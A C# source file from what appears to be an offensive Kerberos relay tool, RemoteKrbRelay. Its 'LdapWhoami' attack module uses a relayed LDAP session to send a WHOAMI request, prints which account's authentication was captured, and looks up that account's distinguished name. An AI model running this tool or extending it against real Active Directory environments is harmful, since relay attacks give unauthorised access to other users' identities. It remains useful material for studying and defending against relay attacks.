using System;
using System.Runtime.InteropServices;
using System.Text;
using static RemoteKrbRelay.Helpers.Natives;
using static RemoteKrbRelay.Helpers.Parsing;

namespace RemoteKrbRelay.Relay.Attacks.Ldap
{
    class LdapWhoami
    {
        private const string LDAP_EXOP_WHO_AM_I = "1.3.6.1.4.1.4203.1.11.3";
        private const int LDAP_SUCCESS = 0;

        public static void attack(IntPtr ld)
        {
            var msgidp = 0;
            var result = ldap_extended_operation(ld, LDAP_EXOP_WHO_AM_I, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref msgidp);
            if (result != LDAP_SUCCESS)
            {
                Console.WriteLine($"ldap_extended_operation failed: {GetErrorString(result)}");
                ldap_unbind(ld);
                return;
            }

            var res = IntPtr.Zero;
            if (ldap_result(ld, msgidp, 1, IntPtr.Zero, ref res) == -1)
            {
                Console.WriteLine("ldap_result failed");
                ldap_unbind(ld);
                return;
            }

            var retoid = IntPtr.Zero;
            var authzid = new berval();
            var point = Marshal.AllocHGlobal(Marshal.SizeOf(authzid));
            Marshal.StructureToPtr(authzid, point, false);

            result = ldap_parse_extended_resultW(ld, res, ref retoid, ref point, 0);
            authzid = Marshal.PtrToStructure<berval>(point);

            if (result != LDAP_SUCCESS)
            {
                Console.WriteLine($"ldap_parse_extended_resultW failed: {GetErrorString(result)}");
                Marshal.FreeHGlobal(retoid);
                ldap_unbind(ld);
                return;
            }

            if (authzid.bv_val != IntPtr.Zero)
            {
                var authzidBytes = new byte[authzid.bv_len];
                Marshal.Copy(authzid.bv_val, authzidBytes, 0, authzid.bv_len);
                var whoami = Encoding.UTF8.GetString(authzidBytes);
                Console.WriteLine($"[+] U've triggered: {whoami}");
                whoami = ExtractUser(whoami);
                var userDn = Generic.getPropertyValue(ld, whoami, "distinguishedName");
                if (!string.IsNullOrEmpty(userDn))
                {
                    Console.WriteLine($"[+] DistinguishedName: {userDn}");
                }
            }

            ldap_unbind(ld);
        }

        private static string GetErrorString(int result)
        {
            if (result == LDAP_SUCCESS)
                return "LDAP_SUCCESS";

            return "Unknown error " + result;
        }

    }
}
